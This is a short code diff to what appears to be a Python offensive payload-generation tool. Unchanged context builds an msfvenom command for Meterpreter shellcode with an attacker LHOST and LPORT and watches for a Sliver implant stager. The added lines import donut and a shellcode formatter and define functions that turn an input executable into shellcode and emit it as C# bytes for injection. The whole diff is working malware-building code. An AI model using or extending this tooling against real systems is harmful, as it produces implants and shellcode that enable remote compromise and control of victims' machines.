@@ -1,5 +1,7 @@
 import subprocess
 import uuid
+import donut
+from ShellcodeFormatter import ShellcodeTransformer, ShellcodeDefinitions
 
 def CreateMetShellCodeFile(payload, lhost, lport, plformat):
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {plformat} -o /tmp/temp.txt"
@@ -50,3 +52,12 @@ def sendApplicationCommand(process,command):
         elif ("Sliver implant stager saved to" in line):
             break
     return ret
+
+def CreateDonutShellCode(inputFile, params):
+    shellcodebytes = donut.create(file=f"{inputFile}",params=f"{params}")
+    definition = ShellcodeDefinitions.get_definition('csharp')
+    shellcode = ShellcodeTransformer(definition).transform_shellcode(shellcodebytes)
+    return shellcode
+
+def GetDonutShellCode(inputFile, params):
+    return CreateDonutShellCode(inputFile, params)
